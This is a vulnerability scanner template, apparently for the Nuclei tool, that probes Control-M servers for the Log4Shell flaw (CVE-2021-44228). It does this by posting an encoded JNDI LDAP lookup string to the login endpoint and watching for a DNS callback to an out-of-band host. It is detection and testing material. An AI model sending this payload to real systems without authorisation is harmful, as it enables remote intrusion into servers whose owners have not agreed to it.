id: cve-2021-44228-controlm-rce
info:
  name: Control-M log4j2 Remote Command Execution (RCE)
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Exploits a remote command execution vulnerability in Control-M log4j2 (CVE-2021-44228). Attackers can use this vulnerability to execute arbitrary commands on the server.
  reference:
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228
    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  tags: rce,log4j2
  classification:
    cve-id: CVE-2021-44228
    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 10.0

variables:
  jndi_payload: "${jndi:ldap://{{interactsh-url}}/}"  

http:
  - raw:
      - |
        POST /ControlM/rest/EmWebServices/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"data":"{{base64(hex_decode('0a' + len(jndi_payload).toString(16) + hex_encode(jndi_payload) + '1201311a' + len(jndi_payload).toString(16) + hex_encode(jndi_payload) + '2001'))}}"}
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - dns
